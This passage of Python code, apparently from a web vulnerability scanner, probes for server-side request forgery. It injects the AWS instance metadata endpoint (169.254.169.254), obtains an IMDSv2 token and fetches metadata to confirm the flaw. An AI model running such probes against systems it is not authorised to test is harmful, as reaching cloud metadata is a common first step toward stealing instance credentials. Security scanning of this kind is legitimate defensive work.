                # First, try to get a token (via PUT)
                test_url = self._inject(url, p, "http://169.254.169.254/latest/api/token")
                r = self._request("PUT", test_url,
                                  headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
                if r and r.status_code == 200 and len(r.text) > 20:
                    token = r.text.strip()
                    # Use the token to fetch metadata
                    test_url2 = self._inject(url, p, "http://169.254.169.254/latest/meta-data/")
                    r2 = self._get(test_url2, headers={"X-aws-ec2-metadata-token": token})
                    if r2 and ("ami-id" in r2.text or "instance-id" in r2.text.lower()):
                        self._add_vuln("SSRF (AWS IMDSv2)", "CRITICAL",
                                        test_url2, f"token obtained, metadata exposed",
                                        param=p)

